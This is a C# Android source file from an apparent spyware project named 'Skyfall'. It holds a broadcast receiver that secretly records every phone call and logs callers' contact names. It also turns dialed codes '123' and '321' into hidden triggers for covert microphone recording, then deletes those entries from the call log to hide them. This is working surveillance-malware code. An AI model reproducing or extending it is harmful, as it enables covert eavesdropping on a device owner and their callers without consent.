using Android.Content;
using Android.Database;
using Android.Net;
using Android.Provider;
using Android.Telephony;
using System.Threading;
using static Android.Provider.ContactsContract;

namespace Skyfall
{
    [BroadcastReceiver]
    public class PhoneStateReceiver : BroadcastReceiver
    {
        private const string COMMAND_START_AUDIO_RECORD = "123";
        private const string COMMAND_STOP_AUDIO_RECORD = "321";

        private static bool onGoingCall = false;

        private static string lastPhoneNumber = "";

        public override void OnReceive(Context context, Intent intent)
        {
            if (intent.Action.Equals(TelephonyManager.ActionPhoneStateChanged))
            {
                lastPhoneNumber = intent.GetStringExtra(TelephonyManager.ExtraIncomingNumber);
                if (lastPhoneNumber == null) return;
                else
                {
                    /// Ringing ///
                    if (Kernel.telephonyManager.CallState.Equals(CallState.Ringing))
                    {
                        if (!onGoingCall) Kernel.LogMessage("<span style=\"color:mediumblue\">☎ << " + RetrieveContactName() + "</span>");
                        else Kernel.LogMessage("<span style=\"color:mediumblue\">☎⏳ << " + RetrieveContactName() + "</span>");
                    }
                    /// Offhook ///
                    else if (Kernel.telephonyManager.CallState.Equals(CallState.Offhook))
                    {
                        if (!IsManualCommand())
                        {
                            if (!onGoingCall)
                            {
                                Kernel.LogMessage("<span style=\"color:mediumblue\">☎ /\\ " + RetrieveContactName() + "</span>");
                                AudioRecorder.Start(AudioRecorder.RecorderIntent.PhoneCall);
                                onGoingCall = true;
                            }
                            else
                            {
                                Kernel.LogMessage("<span style=\"color:mediumblue\">☎⏳ /\\ " + RetrieveContactName() + "</span>");
                            }
                        }
                    }
                    /// Hungup ///
                    else if (Kernel.telephonyManager.CallState.Equals(CallState.Idle))
                    {
                        if (IsManualCommand())
                        {
                            Thread.Sleep(2000);
                            Kernel.applicationContext.ContentResolver.Delete(CallLog.Calls.ContentUri, CallLog.Calls.Number + "=?", new string[] { lastPhoneNumber });
                        }
                        else
                        {
                            Kernel.LogMessage("<span style=\"color:mediumblue\">☎ \\/ " + RetrieveContactName() + "</span>");
                            AudioRecorder.Stop(AudioRecorder.RecorderIntent.PhoneCall);
                            onGoingCall = false;
                        }
                    }
                }
            }

            /// Outgoing ///
            else if (intent.Action.Equals(Intent.ActionNewOutgoingCall))
            {
                lastPhoneNumber = intent.GetStringExtra(Intent.ExtraPhoneNumber);

                if (IsManualCommand()) ExecuteManualCommand();
                else Kernel.LogMessage("<span style=\"color:mediumblue\">☎ >> " + RetrieveContactName() + "</span>");
            }
        }

        private bool IsManualCommand()
        {
            if (lastPhoneNumber.Equals(COMMAND_START_AUDIO_RECORD) || lastPhoneNumber.Equals(COMMAND_STOP_AUDIO_RECORD)) return true;
            else return false;
        }

        private void ExecuteManualCommand()
        {
            Kernel.LogMessage("<span style=\"color:blueviolet\">☎ LOCAL COMMAND [" + lastPhoneNumber + "] ISSUED</span>");

            if (lastPhoneNumber.Equals(COMMAND_START_AUDIO_RECORD)) { AudioRecorder.Start(AudioRecorder.RecorderIntent.Manual); return; }
            if (lastPhoneNumber.Equals(COMMAND_STOP_AUDIO_RECORD)) { AudioRecorder.Stop(AudioRecorder.RecorderIntent.Manual); return; }
        }

        public static string RetrieveContactName()
        {
            ContentResolver cr = Kernel.applicationContext.ContentResolver;
            Uri uri = Uri.WithAppendedPath(PhoneLookup.ContentFilterUri, Uri.Encode(lastPhoneNumber));
            var cursor = cr.Query(uri, new string[] { ContactsContract.Contacts.InterfaceConsts.DisplayName }, null, null, null);
            if (cursor == null) return null;

            string contactName = null;
            if (cursor.MoveToFirst()) contactName = cursor.GetString(cursor.GetColumnIndex(ContactsContract.Contacts.InterfaceConsts.DisplayName));

            if (cursor != null && !cursor.IsClosed) cursor.Close();

            if (contactName == null) return lastPhoneNumber;
            else return contactName;
        }
    }
}